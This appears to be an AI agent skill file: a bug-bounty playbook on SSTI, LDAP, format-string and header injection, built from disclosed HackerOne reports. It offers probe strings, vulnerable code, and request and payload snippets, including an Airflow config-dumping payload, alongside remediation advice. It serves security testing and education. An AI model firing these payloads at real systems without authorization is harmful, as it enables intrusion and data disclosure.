---
name: ssti-injection-misc
description: "Other Injection (LDAP, Format String, Special Elements) offensive playbook from 34 disclosed HackerOne reports (3 critical, 3 high, 12 medium, 16 low). Use when hunting or reviewing other injection (ldap, format string, special elements). Triggers: injection, attacker, arbitrary, allowed, github."
license: "For authorized security testing and education only."
---

# Other Injection (LDAP, Format String, Special Elements)

> Distilled from **34** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Injection into template engines, LDAP filters, format strings, or other special-element interpreters that aren't classic SQLi/XSS/OS command injection.

## Where to hunt

- Probe template contexts with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`; LDAP fields with `*)(&`; format strings with `%n`/`%x`.
- Find mail-merge, report builders, and search filters that interpolate into query languages.

## Exploitation playbook

- SSTI → read config or RCE via the template sandbox escape for that engine.
- LDAP injection → auth bypass or data dump; format-string → memory read/write in native apps.

## Bypass techniques

- Alternate template syntaxes, encoding, nested expressions, engine-specific filters.

## Impact & escalation

- Often reaches RCE or full directory/database disclosure.

## Remediation

- Never concatenate untrusted input into interpreters; use parameterized LDAP/APIs; sandbox templates; avoid user-controlled format strings.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#812907](https://hackerone.com/reports/812907)  -  Bypass voting restriction due to HTTP Header Injection
*medium*

```http
POST /v0/vote HTTP/1.1
Host: api.urbandictionary.com
X-Forwarded-For: 12.34.56.79
Content-Type: application/json; charset=utf-8
Content-Length: 35
Origin: https://hacker.com
Cookie: _ga=GA1.2.47064909.1583578169; _gid=GA1.2.1544677998.1583578169; _urbandictionary_session2=b…

{"defid":12559865,"direction":"up"}
```

### 2. [#906959](https://hackerone.com/reports/906959)  -  [cloudron-surfer] Denial of Service via LDAP Injection
*critical*

```javascript
// https://github.com/nebulade/surfer/blob/master/src/auth.js#L72
// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L74
....

function verifyUser(username, password, callback) {
    if (AUTH_METHOD === 'ldap') {
        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });
        ldapClient.on('error', function (error) {
            console.error('LDAP error', error);
        });

        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {
            if (error) return callback(error);

            var filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`; //<-- INJECTION: username is not sanitized
            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: filter }, function (error, result) {
                if (error) return callback(error);

                var items = [];

                result.on('searchEntry', function(entry) { items.push(entry.object); });
                result.on('error', callback);
                result.on('end', function (result) {
                    if (result.status !== 0 || items.length === 0) return callback('Invalid credentials');

                    // pick the first found
                    var user = items[0];

                    ldapClient.bind(user.dn, password, function (error) {
                        if (error) return callback('Invalid credentials');

                        callback(null, { username: username });
                    });
                });
            });
# … truncated …
```

### 3. [#907311](https://hackerone.com/reports/907311)  -  [meemo-app] Denial of Service via LDAP Injection
*critical*

```javascript
...
exports = module.exports = {
    auth: auth,
    login: login,
    logout: logout,
    profile: profile,

...
// https://github.com/nebulade/meemo/blob/master/src/routes.js#L86
function login(req, res, next) {
    if (typeof req.body.username !== 'string' || !req.body.username) return next(new HttpError(400, 'missing username'));
    if (typeof req.body.password !== 'string' || !req.body.password) return next(new HttpError(400, 'missing password'));

    users.verify(req.body.username, req.body.password, function (error, result) {
        if (error && error.code === UserError.NOT_FOUND) return next(new HttpError(401, 'invalid credentials'));
        if (error && error.code === UserError.NOT_AUTHORIZED) return next(new HttpError(401, 'invalid credentials'));
        if (error) return next(new HttpError(500, error));

        req.session.userId = result.user.username;

        var token = uuid.v4();
        tokens.add(token, '', result.user.username, function (error) {
            if (error) return next(new HttpError(500, error));
            next(new HttpSuccess(201, { token: token, user: result.user }));
        });
    });
}
...
```

### 4. [#1409788](https://hackerone.com/reports/1409788)  -  Arbitrary POST request as victim user from HTML injection in Jupyte…
*high*

```json
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "<h1>asd</h1>",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<div class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\">asdf</div>\n<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">hack</button></div>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
# … truncated …
```

### 5. [#2076786](https://hackerone.com/reports/2076786)  -  Host Header Injection - internal.qa.delivery.indrive.com
*low*

```http
GET / HTTP/1.1
Host: bing.com
```

### 6. [#1039821](https://hackerone.com/reports/1039821)  -  Second-order SOQL injection through email and campaign name paramet…
*low*

```http
POST /leads HTTP/1.1
Host: hackerone.com

campaign_name='&name=A&company_name=B&title=C&phone=D&website=https://e.com
```

More payloads: see [payloads.md](payloads.md) (21 curated).

## Recurring patterns in this dataset

Most frequent terms across the 34 reports (term (count)): `injection` (30), `attacker` (18), `arbitrary` (15), `allowed` (12), `github` (12), `css` (10), `inject` (9), `html` (8), `email` (7), `content` (7), `page` (7), `git` (7), `fixed` (6), `versions` (6), `potentially` (5), `data` (5), `discovered` (5), `request` (5)

## Worked example  -  [report #1707287](https://hackerone.com/reports/1707287)

*CVE-2022-40604: Apache Airflow: Format String Vulnerability* (critical, $8,000)

> There is a Format String Vulnerability in src/airflow/utils/log/file task handler.py url = os.path.join("http://{ti.hostname}:{worker log server port}/log", log relative path).format( ti=ti, worker log server port=conf.get('logging', 'WORKER LOG SERVER PORT') ) In the above code, I can control some part of the log relative path, because log relative path is made up of run id and other things. Attack steps: 1. Enter the DAGs menu, Choose any DAG, select Trigger DAG w/ config. 2. Set the run id to {ti.task. class . init . globals [conf]. dict } and trigger it. 3. Enter the /xcom/list/ page, click to enter the corresponding task page. 4. Click the Log option and capture the packet, you will get…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1707287](https://hackerone.com/reports/1707287) | critical | $8,000 | ibb | CVE-2022-40604: Apache Airflow: Format String Vulnerability |
| [#906959](https://hackerone.com/reports/906959) | critical |  -  | nodejs-ecosystem | [cloudron-surfer] Denial of Service via LDAP Injection |
| [#907311](https://hackerone.com/reports/907311) | critical |  -  | nodejs-ecosystem | [meemo-app] Denial of Service via LDAP Injection |
| [#1409788](https://hackerone.com/reports/1409788) | high |  -  | gitlab | Arbitrary POST request as victim user from HTML injection in Jupyter notebooks |
| [#1533976](https://hackerone.com/reports/1533976) | high |  -  | gitlab | Content injection in Jira issue title enabling sending arbitrary POST request as victim |
| [#3688064](https://hackerone.com/reports/3688064) | high |  -  | nodejs | Node.js unicode dot separator handling can lead to tls wildcard-depth authentication by… |
| [#790634](https://hackerone.com/reports/790634) | medium | $2,000 | gitlab | When you call your branch the same name as a git hash, it could be checked out by depen… |
| [#1391549](https://hackerone.com/reports/1391549) | medium | $1,200 | ibb | Request line injection via HTTP/2 in Apache mod_proxy |

*See [reference.md](reference.md) for all 34 reports in this class.*
